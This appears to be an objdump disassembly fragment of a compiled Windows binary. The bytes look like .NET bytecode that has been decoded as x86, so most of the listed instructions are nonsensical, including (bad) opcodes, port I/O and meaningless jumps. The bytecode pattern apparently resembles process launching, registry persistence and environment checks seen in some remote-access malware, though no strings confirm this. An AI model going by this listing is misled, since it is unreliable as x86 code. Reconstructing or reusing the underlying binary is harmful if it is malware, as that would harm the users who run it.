  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 8a       	add    $0x8a720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 92 21       	and    $0x21927216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 fc    	or     -0x38de7db(%edx),%ah
  4031e4:	21 00                	and    %eax,(%eax)
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 0e    	or     0xe721a25(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 22             	or     0x22(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 80             	or     -0x80(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 80             	or     -0x80(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 84                	jb     0x403247
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 8e             	or     %esi,-0x72(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 a2                	jb     0x403288
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 c2                	jb     0x4032b4
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 80             	or     -0x80(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 d8                	jb     0x4032e6
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 e0                	jb     0x403304
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 ec                	jb     0x40331c
  403330:	22 00                	and    (%eax),%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 fc                	jb     0x403469
  40346d:	22 00                	and    (%eax),%al
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 02             	adc    %esi,0x2(%edx)
  4034ae:	23 00                	and    (%eax),%eax
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 48 23    	or     0x23487209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	62 23                	bound  %esp,(%ebx)
  4034ed:	00 70 28             	add    %dh,0x28(%eax)
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 8e             	or     %esi,-0x72(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 9a             	or     -0x66(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	aa                   	stos   %al,%es:(%edi)
  403521:	23 00                	and    (%eax),%eax
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 8e                	jb     0x4034bf
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 b8             	or     -0x48(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 ce             	adc    %esi,-0x32(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
